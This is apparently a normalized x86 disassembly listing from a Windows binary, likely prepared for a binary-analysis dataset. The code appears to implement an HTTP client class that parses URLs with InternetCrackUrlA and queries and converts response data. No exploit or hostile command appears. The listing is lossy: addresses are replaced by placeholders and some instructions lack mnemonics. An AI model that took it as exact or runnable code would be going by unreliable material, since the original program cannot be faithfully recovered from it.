sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_40de34
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov al [ ebp - 0xd ]
push ebx
mov ebx ecx
push esi
push edi
push 0x0
lea ecx [ ebx + 0x4 ]
mov [ ebp - 0x1c ] ebx
mov [ ecx ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0x14 ]
push 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] dl
call sub_402ca0
mov al [ ebp - 0xd ]
lea esi [ ebx + 0x30 ]
push 0x0
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0x48 ]
push 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ecx ] dl
call sub_402ca0
mov al [ ebp - 0xd ]
lea ecx [ ebx + 0x6c ]
push 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ecx ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0x7c ]
push 0x0
mov [ ebp - 0x4 ] 0x4
mov [ ecx ] dl
call sub_402ca0
mov al [ ebp - 0xd ]
lea ecx [ ebx + 0x8c ]
push 0x0
mov [ ebp - 0x4 ] 0x5
mov [ ecx ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0x9c ]
push 0x0
mov [ ebp - 0x4 ] 0x6
mov [ ecx ] dl
call sub_402ca0
mov al [ ebp - 0xd ]
lea ecx [ ebx + 0xac ]
push 0x0
mov [ ebp - 0x4 ] 0x7
mov [ ecx ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0xcc ]
push 0x0
mov [ ebp - 0x4 ] 0x8
mov [ ecx ] dl
call sub_402ca0
mov al [ ebp - 0xd ]
lea ecx [ ebx + 0xdc ]
push 0x0
mov [ ebp - 0x4 ] 0x9
mov [ ecx ] al
call sub_402ca0
mov dl [ ebp - 0xd ]
lea ecx [ ebx + 0xec ]
push 0x0
mov [ ebp - 0x4 ] 0xa
mov [ ecx ] dl
call sub_402cf0
mov al [ ebp - 0xd ]
lea ecx [ ebx + 0xfc ]
push 0x0
mov [ ebp - 0x4 ] 0xb
mov [ ecx ] al
call sub_402ca0
mov [ ebp - 0x4 ] 0xc
mov [ ebx ] r--data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
mov ecx esi
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ ebx + 0x4 ]
push esi
mov [ ebp - 0x14 ] esi
call sub_402e80
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ ebx + 0x14 ]
push esi
mov [ ebp - 0x14 ] esi
call sub_402e80
test al al
je r-xdata
mov edi [ ebx + 0x8 ]
mov ecx esi
lea eax [ ebx + 0x4 ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
xor esi esi
or ecx 0xffffffff
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] esi
mov [ ebx + 0x2c ] esi
mov [ ebx + 0x44 ] esi
mov edi [ rw-data ]
xor eax eax
mov [ ebp - 0x14 ] edi
push 0x1
[ edi ]
not ecx
dec ecx
mov edi ecx
lea ecx [ ebx + 0x48 ]
push edi
mov [ ebp - 0x18 ] edi
call sub_402e80
test al al
je r-xdata
mov edi [ ebx + 0x18 ]
mov ecx esi
lea eax [ ebx + 0x14 ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
mov eax 0x7530
mov edi rw-data
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x64 ] eax
or ecx 0xffffffff
xor eax eax
mov [ ebx + 0x58 ] esi
mov [ ebx + 0x5c ] 0xea60
mov [ ebx + 0x68 ] 0x0
push 0x1
[ edi ]
not ecx
dec ecx
mov edi ecx
lea ecx [ ebx + 0x6c ]
push edi
mov [ ebp - 0x18 ] edi
call sub_402e80
test al al
je r-xdata
mov esi [ ebp - 0x14 ]
mov ecx edi
mov edi [ ebx + 0x4c ]
lea eax [ ebx + 0x48 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
xor esi esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov edi ecx
lea ecx [ ebx + 0x7c ]
push edi
mov [ ebp - 0x18 ] edi
call sub_402e80
test al al
je r-xdata
mov ecx edi
mov edi [ ebx + 0x70 ]
lea eax [ ebx + 0x6c ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
xor esi esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov edi ecx
lea ecx [ ebx + 0x8c ]
push edi
mov [ ebp - 0x18 ] edi
call sub_402e80
test al al
je r-xdata
mov ecx edi
mov edi [ ebx + 0x80 ]
lea eax [ ebx + 0x7c ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
xor esi esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ ebx + 0xbc ] esi
mov [ ebx + 0xc0 ] esi
mov [ ebx + 0xc4 ] esi
mov [ ebx + 0xc8 ] esi
push 0x1
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ ebx + 0xcc ]
push esi
mov [ ebp - 0x18 ] esi
call sub_402e80
test al al
je r-xdata
mov ecx edi
mov edi [ ebx + 0x90 ]
lea eax [ ebx + 0x8c ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
xor esi esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ ebx + 0xdc ]
push esi
mov [ ebp - 0x18 ] esi
call sub_402e80
test al al
je r-xdata
mov edi [ ebx + 0xd0 ]
mov ecx esi
lea eax [ ebx + 0xcc ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
push rw-data
call sub_406e72
add esp 0x4
mov edi eax
lea esi [ ebx + 0xec ]
push 0x1
push edi
mov ecx esi
call sub_4031b0
test al al
je r-xdata
mov edi [ ebx + 0xe0 ]
mov ecx esi
lea eax [ ebx + 0xdc ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ ebx + 0xfc ]
push esi
mov [ ebp - 0x18 ] esi
call sub_402e80
test al al
je r-xdata
mov edx [ esi + 0x4 ]
push edi
push rw-data
push edx
call sub_4014b0
add esp 0xc
mov ecx esi
push edi
call sub_403190
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x100 ]
mov ecx esi
lea eax [ ebx + 0xfc ]
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
mov ecx eax
call sub_402e60
sub_4014b0
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
mov ecx eax
test esi esi
jbe r-xdata
pop esi
retn
mov edx [ esp + 0xc ]
push edi
mov di [ edx ]
add edx 0x2
mov [ ecx ] di
add ecx 0x2
dec esi
jne r-xdata
pop edi
sub_401500
push 0xffffffff
push sub_40dee4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x44 ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x14 ] 0xc
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
push eax
call sub_4026f0
mov eax [ esi + 0xc4 ]
cmp eax ebx
je r-xdata
push eax
call sub_406b10
add esp 0x4
push 0x1
lea ecx [ esi + 0xfc ]
mov [ esp + 0x18 ] 0xb
call sub_402ca0
push 0x1
lea ecx [ esi + 0xec ]
mov [ esp + 0x18 ] 0xa
call sub_402cf0
push 0x1
lea ecx [ esi + 0xdc ]
mov [ esp + 0x18 ] 0x9
call sub_402ca0
push 0x1
lea ecx [ esi + 0xcc ]
mov [ esp + 0x18 ] 0x8
call sub_402ca0
push 0x1
lea ecx [ esi + 0xac ]
mov [ esp + 0x18 ] 0x7
call sub_402ca0
push 0x1
lea ecx [ esi + 0x9c ]
mov [ esp + 0x18 ] 0x6
call sub_402ca0
push 0x1
lea ecx [ esi + 0x8c ]
mov [ esp + 0x18 ] 0x5
call sub_402ca0
mov eax [ esi + 0x80 ]
cmp eax ebx
je r-xdata
push eax
call sub_406b10
add esp 0x4
mov [ esi + 0x80 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x88 ] ebx
mov eax [ esi + 0x70 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x70 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov eax [ esi + 0x4c ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x54 ] ebx
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_401710
push 0xffffffff
push sub_40def8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x658
push ebx
push esi
push edi
mov ebx ecx
mov dl [ rw-data ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x4d ]
mov [ esp + 0x4c ] dl
mov [ esp + 0x150 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x144
xor eax eax
lea edi [ esp + 0x151 ]
mov esi [ esp + 0x678 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x10 ]
mov [ esp + 0x66c ] 0x0
[ edi ]
lea eax [ esp + 0x4c ]
lea ecx [ esp + 0x150 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] 0x3c
test esi esi
mov [ esp + 0x24 ] 0x104
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] 0x514
mov [ esp + 0x18 ] 0x1
mov eax r--data
je r-xdata
mov ecx [ esp + 0x67c ]
lea edx [ esp + 0x10 ]
push edx
push 0x0
push ecx
push eax
call [ InternetCrackUrlA@IAT ]
test eax eax
je r-xdata
mov eax esi
test esi esi
je r-xdata
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
lea ebp [ ebx + 0x4 ]
mov esi ecx
push 0x1
push esi
mov ecx ebp
mov [ esp + 0x18 ] esi
call sub_402e80
test al al
je r-xdata
xor al al
mov al [ esi - 0x1 ]
test al al
je r-xdata
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
mov edi [ esp + 0x40 ]
and eax 0xffff
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x24 ] edx
or ecx 0xffffffff
xor eax eax
mov esi edi
add ebx 0x14
[ edi ]
not ecx
dec ecx
push 0x1
mov ebp ecx
mov ecx ebx
push ebp
call sub_402e80
test al al
je r-xdata
mov edi [ ebp + 0x4 ]
mov ecx esi
mov edx ecx
lea esi [ esp + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ecx + eax ] 0x0
dec esi
push esi
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x67c ]
pop ebp
test ecx ecx
je r-xdata
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
dec al
mov [ esi - 0x1 ] al
jmp r-xdata
mov al 0x1
jmp r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x664 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x664
retn 0x10
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
mov al 0x1
jmp r-xdata
sub_4018f0
push ebp
mov ebp esp
push 0xffffffff
push sub_40df20
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
mov ebx ecx
push esi
xor esi esi
mov eax [ ebx + 0x38 ]
push edi
cmp eax esi
mov [ ebp - 0xd ] 0x1
ja r-xdata
mov al [ ebp + 0xc ]
mov [ ebp - 0x34 ] esi
mov [ ebx + 0x40 ] al
mov eax [ ebp + 0x8 ]
mov edx [ r--data ]
mov [ ebp - 0x30 ] esi
mov cl [ eax ]
push edx
mov [ ebp - 0x38 ] cl
push esi
push eax
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x2c ] esi
call sub_402a00
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x4 ] esi
cmp eax esi
jne r-xdata
mov [ ebx + 0x2c ] 0x3
jmp r-xdata
push rw-data
push eax
call sub_40dc30
add esp 0x8
test eax eax
jne r-xdata
mov eax r--data
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x34 ]
cmp eax esi
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x1
mov [ ebp + 0xc ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
call sub_402e80
test al al
je r-xdata
push rw-data
push eax
call sub_40dc30
add esp 0x8
test eax eax
jne r-xdata
mov eax r--data
cmp [ ebx + 0x44 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov esi rw-data
mov ecx eax
jmp r-xdata
mov [ ebx + 0x2c ] 0x57
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x1
mov [ ebp + 0xc ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
call sub_402e80
test al al
je r-xdata
mov edx [ ebx + 0x44 ]
mov ecx ebx
push edx
call sub_402340
mov al [ ebx + 0x30 ]
lea edi [ ebx + 0x30 ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0xc ] esp
mov [ ecx ] al
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] esi
mov [ ecx + 0xc ] esi
mov edx [ r--data ]
push edx
push esi
push edi
call sub_402a00
mov ecx ebx
call sub_401710
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
cmp eax esi
jne r-xdata
mov edi [ ebp - 0x34 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
xor esi esi
mov [ ecx + eax ] 0x0
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov esi rw-data
mov ecx eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp eax esi
jne r-xdata
push eax
mov ecx ebx
call sub_402320
cmp eax esi
mov [ ebx + 0x44 ] eax
jne r-xdata
mov eax r--data
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx esi
je r-xdata
mov ecx [ ebx + 0x28 ]
mov edx [ ebx + 0x44 ]
push ecx
push eax
push edx
mov ecx ebx
call sub_402390
mov edi eax
cmp edi esi
mov [ ebp - 0x28 ] edi
je r-xdata
mov eax r--data
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov ecx r--data
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx esi
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax esi
jne r-xdata
mov ecx eax
dec al
mov [ ecx - 0x1 ] al
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebx + 0x24 ]
push edx
push ecx
push eax
push edi
mov ecx ebx
call sub_4023c0
mov esi eax
test esi esi
mov [ ebp - 0x1c ] esi
je r-xdata
mov eax r--data
push edi
mov ecx ebx
call sub_4026f0
xor esi esi
mov al [ ebx + 0x68 ]
test al al
jne r-xdata
mov [ ebp + 0xc ] 0x0
cmp [ ebx + 0x24 ] 0x4
jne r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebx + 0x74 ]
test eax eax
jbe r-xdata
lea eax [ ebp + 0xc ]
push 0x4
push eax
push esi
mov ecx ebx
mov [ ebp + 0xc ] 0x3100
call sub_402430
mov eax [ ebx + 0x84 ]
test eax eax
jbe r-xdata
mov dl [ ebx + 0x6c ]
lea edi [ ebx + 0x6c ]
sub esp 0x10
xor eax eax
mov ecx esp
mov [ ebp + 0x8 ] esp
mov [ ecx ] dl
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov edx [ r--data ]
push edx
push eax
push edi
call sub_402a00
push esi
mov ecx ebx
call sub_402450
test eax eax
jne r-xdata
mov eax [ ebx + 0x94 ]
test eax eax
jbe r-xdata
push esi
mov ecx ebx
call sub_4024b0
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
push esi
mov ecx ebx
call sub_402610
test eax eax
jne r-xdata
push esi
mov ecx ebx
call sub_4024e0
test al al
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
push esi
mov ecx ebx
call sub_402620
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0xbc ]
xor edi edi
cmp eax edi
je r-xdata
push esi
mov ecx ebx
call sub_402640
test al al
je r-xdata
push esi
mov ecx ebx
call sub_402670
test eax eax
jne r-xdata
mov edx [ ebx + 0xc0 ]
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
push esi
mov ecx ebx
mov [ ebp + 0x8 ] edi
call sub_402650
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx eax
inc eax
cmp ecx 0x3
mov [ ebp + 0xc ] eax
jae r-xdata
push esi
mov ecx ebx
call sub_402620
test eax eax
je r-xdata
lea eax [ ebp + 0xc ]
mov ecx ebx
push eax
push edi
push 0x16
push esi
mov [ ebp + 0xc ] edi
call sub_402690
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4075a5
add esp 0x4
cmp eax edi
mov [ ebp + 0x8 ] eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebx + 0xc4 ]
mov [ ebp - 0x20 ] 0x2800
cmp eax edi
mov [ ebp + 0x8 ] edi
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x16
push esi
mov ecx ebx
call sub_402690
test eax eax
je r-xdata
push 0x2800
call sub_4075a5
mov edi eax
add esp 0x4
test edi edi
mov [ ebx + 0xc4 ] edi
je r-xdata
push eax
call sub_406b10
add esp 0x4
mov [ ebx + 0xc4 ] edi
mov eax [ ebp + 0x8 ]
push eax
call sub_406b10
add esp 0x4
xor edi edi
mov edi [ ebp + 0x8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0xcc ]
[ edi ]
not ecx
dec ecx
push 0x1
mov [ ebp - 0x24 ] ecx
push ecx
mov ecx edx
call sub_402e80
test al al
je r-xdata
mov ecx 0xa00
xor eax eax
[ edi ]
lea eax [ ebp + 0xc ]
mov ecx ebx
push eax
push 0x0
push 0x19
push esi
mov [ ebp + 0xc ] 0x0
call sub_402690
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebx + 0xd0 ]
mov esi [ ebp + 0x8 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xd0 ]
mov esi [ ebp - 0x1c ]
mov [ ebx + 0xd4 ] eax
add eax ecx
mov [ eax ] 0x0
call [ GetLastError@IAT ]
mov [ ebx + 0x2c ] eax
mov edx [ ebp + 0xc ]
inc edx
push edx
call sub_4075a5
add esp 0x4
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_4075a5
mov edi eax
add esp 0x4
test edi edi
mov [ ebp - 0x14 ] edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov edx [ ebp + 0x8 ]
xor esi esi
mov [ ebx + 0xc8 ] edx
mov eax [ ebx + 0xe0 ]
cmp eax esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x0
lea ecx [ eax + 0x1 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
mov edx [ ebp - 0x18 ]
and ecx 0x3
[ edi ]
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
push ecx
push edx
push esi
mov ecx ebx
call sub_4026d0
test eax eax
je r-xdata
lea edx [ ebp + 0xc ]
mov ecx ebx
push edx
push edi
push 0x19
push esi
call sub_402690
test eax eax
je r-xdata
push rw-data
push eax
call sub_40dc30
add esp 0x8
test eax eax
jne r-xdata
mov eax r--data
lea ecx [ ebp + 0xc ]
mov [ ebp + 0xc ] 0x0
push ecx
push esi
mov ecx ebx
call sub_4026b0
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call sub_406b10
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
add ecx eax
mov eax [ ebp - 0x20 ]
cmp ecx eax
jbe r-xdata
push edi
call sub_406b10
add esp 0x4
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edx [ ebx + 0xdc ]
push 0x1
mov [ ebp - 0x24 ] ecx
push ecx
mov ecx edx
call sub_402e80
test al al
je r-xdata
mov eax [ ebx + 0xc8 ]
mov ecx [ ebx + 0xc4 ]
mov edx [ ebp - 0x18 ]
mov edi [ MultiByteToWideChar@IAT ]
push 0x0
inc eax
push 0x0
push eax
mov eax [ ebp - 0x14 ]
push ecx
push edx
push eax
call edi
mov esi eax
test esi esi
jg r-xdata
mov [ ebp - 0x14 ] 0xfde9
mov [ ebp - 0x18 ] esi
mov ecx [ ebp - 0x14 ]
mov edi [ ebx + 0xc4 ]
mov eax [ ebp + 0x8 ]
mov esi [ ebp - 0x18 ]
mov edx ecx
add edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp - 0x14 ]
mov esi [ ebp - 0x1c ]
add eax ecx
mov [ ebp + 0x8 ] eax
mov edx [ ebx + 0xc4 ]
lea esi [ eax + eax ]
push esi
mov [ ebp - 0x24 ] edx
call sub_4075a5
mov edi eax
add esp 0x4
test edi edi
mov [ ebx + 0xc4 ] edi
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
mov edi [ ebx + 0xe0 ]
mov esi [ ebp - 0x14 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xe0 ]
mov esi [ ebp - 0x1c ]
mov [ ebx + 0xe4 ] eax
add eax ecx
mov [ eax ] 0x0
lea eax [ esi + esi ]
push eax
call sub_4075a5
add esp 0x4
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ ebx + 0xc8 ]
mov edx [ ebx + 0xc4 ]
push 0x0
inc ecx
push 0x0
push ecx
push edx
push 0x1
push 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x1
call edi
mov esi eax
test esi esi
jle r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0xd ] 0x0
mov [ ebx + 0xc4 ] ecx
mov ecx esi
xor eax eax
mov [ ebp - 0x20 ] ecx
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov edi [ ebx + 0xc4 ]
mov edx ecx
mov esi eax
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_406b10
add esp 0x4
mov esi [ ebx + 0xc4 ]
mov dl [ ebp + 0xf ]
xor eax eax
mov edi esi
or ecx 0xffffffff
mov [ ebp - 0x48 ] dl
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
push 0x1
[ edi ]
not ecx
dec ecx
mov [ ebp + 0x8 ] ecx
push ecx
lea ecx [ ebp - 0x48 ]
call sub_402e80
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx esi
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov ecx [ ebx + 0xc8 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0xc4 ]
inc ecx
push eax
mov eax [ ebp - 0x18 ]
push ecx
mov ecx [ ebp - 0x14 ]
